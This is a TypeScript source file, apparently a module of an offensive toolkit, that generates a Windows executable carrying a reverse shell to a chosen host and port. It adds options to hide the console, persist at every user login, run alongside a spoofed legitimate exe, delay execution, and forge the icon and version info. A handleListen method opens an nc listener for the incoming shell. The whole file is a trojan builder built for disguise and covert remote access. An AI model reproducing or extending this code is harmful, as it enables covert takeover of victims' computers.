import {
    execSync,
    spawn,
} from 'child_process';
import { createIco } from 'create-ico';
import fs from 'fs';
import isImage from 'is-image';
import path from 'path';

import { Module } from '../../classes/Module';
import { cmdWarn } from '../../utils/cmd';

// save the path to pkg cache folder
const cachePath = path.join(__dirname, '../../pkg-cache');
const PKG_CACHE_VERSION = 'v2.6';

export default class ReverseShellModule extends Module {
    description = 'Generate an exe with reverse shell in it.';
    iconPath = __dirname + '/exe.ico';
    listenPort = 4242;
    hostIp = '10.0.2.2';
    finalExeName = 'payload.exe';
    finalExeDescription = 'sussy backa';
    runSilent: 'true'|'false' = 'true';
    isPersistent: 'true'|'false' = 'true';
    isFilesDependant: 'true'|'false' = 'false';
    mergeFilePath = '';
    hostCmd = `nc -n 127.0.0.1 -l ${this.listenPort}`;
    waitRun = 0;
    
    public args = [
        {
            arg: 'l_port=',
            desc: "Set listening port. Default is 4242",
            handler: this.handleSetPort
        },
        {
            arg: 'l_host=',
            desc: "Set listening host ip. Default is 10.0.2.2",
            handler: host => this.hostIp = host 
        },
        {
            arg: 'exe_name=',
            desc: "Name of the exe file generated. Default is payload.exe",
            handler: name => name.endsWith('.exe') ? (this.finalExeName = name) : (this.finalExeName = name + '.exe')
        },
        {
            arg: 'exe_desc=',
            desc: "Description of the exe file generated. Default is 'sussy backa'",
            handler: desc => this.finalExeDescription = desc
        },
        {
            arg: 'exe_spoof=',
            desc: 'Path to an EXE file to run in correlation to the payload.',
            handler: this.handleSetMergePath
        },
        {
            arg: 'wait_sec=',
            desc: "Set number of seconds to wait before executing the payload.",
            handler: this.handleSetWaitSec 
        },
        {
            arg: 'run_silent=',
            desc: "Should the exe hide the console window. Default is true.",
            handler: this.handleSetSilent
        },
        {
            arg: 'persist=',
            desc: "Should the exe auto start on each user login. Default is true.",
            handler: this.handleSetAutoStart
        },
        {
            arg: 'link_files=',
            desc: "Set this to true if the exe is supposed to use the files in the folder it is ran from. Default is false.",
            handler: this.handleSetLinkFiles 
        },
        {
            arg: 'ico_path=',
            desc: "Set path for image or ico used as icon of generated exe.",
            handler: this.handleSetIcon
        },
        {
            arg: 'gen',
            desc: "Generate an exe file with reverse shell.",
            handler: this.handleGenerate
        },
        {
            arg: 'listen',
            desc: "Open a new terminal window and listen for incoming connections.",
            handler: this.handleListen
        }
    ]
    
    handleSetPort(port){
        if(isNaN(Number(port))){
            cmdWarn(`Error, l_port= expects a number, got ${port}`);
            return;
        }
        this.listenPort = Number(port)
    }

    handleSetWaitSec(sec) {
        if(isNaN(Number(sec))){
            cmdWarn(`Error, wait_run= expects a number, got ${sec}`);
            return;
        }
        this.waitRun = Number(sec)
    }


    handleSetSilent(value) {
        if(['true', 'false'].includes(value.toLowerCase()))
        this.runSilent = value.toLowerCase()
        else cmdWarn(`Error, run_silent= expects a true or false. Got: ${value}`);
    }

    handleSetAutoStart(value){
        if(['true', 'false'].includes(value.toLowerCase()))
        this.isPersistent = value.toLowerCase()
        else cmdWarn(`Error, persist= expects a true or false. Got: ${value}`);
    }

    handleSetLinkFiles(value) {
        if(['true', 'false'].includes(value.toLowerCase()))
        this.isFilesDependant = value.toLowerCase()
        else cmdWarn(`Error, link_files= expects a true or false. Got: ${value}`);
    }

    handleSetMergePath(path: string) {
        if(!fs.existsSync(path)){
            cmdWarn(`Error, path to spoof exe not found: ${path}`);
            return;
        }
        if(!path.endsWith('.exe')){
            cmdWarn(`Error, exe_spoof has to be a path to an exe file. ${path}`);
            return;
        }

        this.mergeFilePath = path;

        // copy the file as an asset
        fs.copyFileSync(path, __dirname + '/win-proj/winResource.exe');
    }

    async handleGenerate() {
        // generate the dummy index.js file based on params
        const placeholder = this.getPlaceholder();
        const dummyJs = __dirname + '/win-proj/index.js';
        fs.writeFileSync(dummyJs, placeholder);

        // download pkg precompiled binaries
        if(fs.readdirSync(cachePath).length > 0){
            console.log('[log] - Using existing precompiled binaries...');
        }
        else {
            console.log('[log] - Downloading precompiled binaries...');
            this.executePkg(dummyJs, 'temp.exe');
            fs.unlinkSync(path.join(__dirname, `../../temp.exe`));
        }
        
        // get path of fetched binary for windows
        const winBin = fs.readdirSync(path.join(cachePath, `./${PKG_CACHE_VERSION}`)).find(f => f.includes('win'));

        // change version info
        console.log('[log] - Changing version info...');
        await this.changeVersionInfo(path.join(cachePath, `./${PKG_CACHE_VERSION}`, winBin));

        // append custom icon to the pkg binaries
        console.log('[log] - Appending custom icon...');
        await this.changeIcon(path.join(cachePath, `./${PKG_CACHE_VERSION}`, winBin));

        // compile final exe
        console.log('[log] - Compiling final exe...');
        this.executePkg(dummyJs, this.finalExeName);
        
        // make the exe hidden
        if(this.runSilent.toLowerCase() == "true"){
            console.log('[log] - Making the exe hidden...');
            require('create-nodew-exe')({
                src: path.join(__dirname, `../../${this.finalExeName}`),
                dst: path.join(__dirname, `../../${this.finalExeName}`),
            });
        }

        // remove the leftovers
        console.log('[log] - Removing leftover files...');
        fs.unlinkSync(dummyJs);
    }

    async handleListen() {
        // open terminal window with listener
        spawn("xterm", ["-hold", "-e", this.hostCmd]);
    }

    async handleSetIcon(inputIconPath: string){
        if(!fs.existsSync(inputIconPath)) {
            cmdWarn(`Error, icon not found: ${inputIconPath}`);
            return;
        }
        if(!(inputIconPath.endsWith('.ico') || isImage(inputIconPath))){
            cmdWarn(`Error, invalid path for icon: ${inputIconPath}`);
            return;
        }

        if(inputIconPath.endsWith('.ico')){
            this.iconPath = inputIconPath;
        }
        else {
            let ico = await createIco(inputIconPath, { sizes: [16, 32, 48, 64, 128, 256] });
            this.iconPath = __dirname + '/set.ico';
            fs.writeFileSync(this.iconPath, ico);
        }
    }

    // external functions
    // not related to the argument handlers

    resourceHacker(argumentValueMap) {
        return execSync(
            `wine ${__dirname + '/rh/ResourceHacker.exe'} ${Object.entries(argumentValueMap)
                .map(([key, value]) => `-${key} ${value}`)
                .join(' ')}`, 
            {stdio : 'pipe' }
        );
    }

    getPlaceholder(): string {
        let str:string = fs.readFileSync(__dirname + '/template.js').toString();
        str = str.replace('{{HOST}}', this.hostIp);
        str = str.replace('{{HAS_MERGE}}', this.mergeFilePath.length > 0 ? "true" : "false");
        str = str.replace('{{FILES_DEPENDANT}}', this.isFilesDependant);
        str = str.replace('{{PERSISTENT}}', this.isPersistent);
        str = str.replace('{{MERGE_NAME}}', this.finalExeName);
        str = str.replace('{{LISTEN_PORT}}', this.listenPort.toString());
        str = str.replace('{{WAIT_TIME}}', this.waitRun.toString());
        return str;
    }

    executePkg(jsPath, exeName){
        try { execSync(`PKG_CACHE_PATH=${cachePath} pkg ${jsPath} --target win --compress GZip --output ${exeName}`, 
        {stdio : 'pipe' }) } catch { }
    }

    async changeIcon(winBin) {
        this.resourceHacker({
            action: "addoverwrite",
            open: winBin,
            save: winBin,
            resource: this.iconPath,
            mask: "ICONGROUP,1,",
        });
    }

    async changeVersionInfo(winBin) {
        let templateData = fs.readFileSync(__dirname + '/rctemplate.rc').toString();

        // replace meta data
        templateData = templateData.replace(new RegExp('{{FILENAME}}', 'g'), this.finalExeName);
        templateData = templateData.replace(new RegExp('{{DESCRIPTION}}', 'g'), this.finalExeDescription);

        // generate template to .rc
        fs.writeFileSync(__dirname + '/vinfo.rc', templateData);

        // convert .rc to .res
        this.resourceHacker({
            action: 'compile',
            open: __dirname + '/vinfo.rc',
            save: __dirname + '/vinfo.res',
        });

        // append the fake info to the pkg binary
        this.resourceHacker({
            action: 'addoverwrite',
            open: winBin,
            save: winBin,
            resource: __dirname + '/vinfo.res',
        });
    }
}